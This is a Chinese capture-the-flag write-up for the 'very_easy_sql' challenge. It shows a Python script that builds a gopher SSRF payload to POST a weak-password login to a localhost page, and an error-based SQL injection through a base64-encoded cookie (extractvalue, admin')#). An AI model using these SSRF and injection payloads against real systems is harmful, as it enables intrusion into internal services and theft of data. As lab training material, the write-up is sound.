# 攻防世界 very_easy_sql(难度3) ssrf

## 思路

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1681725693148-cdf5d3c6-1f0c-4163-ac54-3383624e4e4a.png#averageHue=%23fafaf9&clientId=u775767ba-4dce-4&from=paste&height=162&id=ud8dfee1e&originHeight=323&originWidth=1204&originalType=binary&ratio=2&rotation=0&showTitle=false&size=20016&status=done&style=none&taskId=u0618f0ac-7614-47e0-8b55-4181a4a5119&title=&width=602)

- 点进去之后，发现这显然是ssrf，之前学的ssrf都是直接ssrf+mysql或者ssrf+redis，这里有ssrf+mysql会显示no,no,no，显然不行

放弃，看wp

## wp

### 查看源码发现curl

- 由于最开始的index.php界面需要是内网用户，且需要输入密码，因此找到可以curl的地方。
- 查看源码，发现/use.php(草，太久没做，查看源码都忘了)

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1681725788452-900c5236-1204-49cb-96de-70365693c735.png#averageHue=%23fbfbfa&clientId=u775767ba-4dce-4&from=paste&height=203&id=kbwJy&originHeight=405&originWidth=952&originalType=binary&ratio=2&rotation=0&showTitle=false&size=42127&status=done&style=none&taskId=ue9cd70b6-76aa-45ee-a78f-9a8e2c48942&title=&width=476)

### gopher+弱密码登录

- 可以用gopher访问127.0.0.1:80的index.php界面，上脚本，尝试用gopher+弱密码登录。burp抓包，访问/use.php。

```python
import urllib.parse
import base64


host = "127.0.0.1:80"
content = "uname=admin&passwd=admin"

# str = "admin') and extractvalue(1, concat(0x7e, (substr((select group_concat(flag) from flag), 20,50)),0x7e)) #"
# # 将字符串编码为bytes类型，然后使用base64.b64encode()函数进行Base64编码
# encoded_bytes = base64.b64encode(str.encode('utf-8'))

# # 将bytes类型的编码结果转换为字符串类型
# encoded_str = encoded_bytes.decode('utf-8')

content_length = len(content)
# cookie = f'this_is_your_cookie={encoded_str}'
test =\
"""POST /index.php HTTP/1.1
Host: {}
Content-Type: application/x-www-form-urlencoded
Content-Length: {}

{}
""".format(host,content_length, content)#\用于将字符串延续到下一行

tmp = urllib.parse.quote(test) 
new = tmp.replace("%0A","%0D%0A")#需要用%0d%0a换行
result = urllib.parse.quote(new) #二次url编码，因为php在收到后就进行了一次解码
print("gopher://"+host+"/_"+result)


```

- 此时有回显，发现cookie处是admin经过base64加密的结果

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1681726145844-d463442a-6dba-49c0-ac59-2933580a9f10.png#averageHue=%23f0f0f0&clientId=u775767ba-4dce-4&from=paste&height=214&id=OnZgK&originHeight=428&originWidth=1216&originalType=binary&ratio=2&rotation=0&showTitle=false&size=29856&status=done&style=none&taskId=u42b121ff-4b78-4549-a28f-fe941222623&title=&width=608)

### cookie注入

- 在发的包里加一个`Cookie=this_is_your_cookie=此处填写base64_encode(注入的payload)`
- 这里用`admin')#`测试成功，很奇怪
- 发现可以报错注入，用extractvalue + 爆破信息的语句即可获得flag

## 总结

- 记得查看源代码
- ssrf主要用gopher，除了gopher + mysql，还可以`gopher://127.0.0.1:80/index.php`
- 要对构造gopher payload的脚本很熟悉
- Cookie注入之前没注意过，要多看包的信息。
- Cookie注入有`admin')#`这种闭合方式，多注意`)`。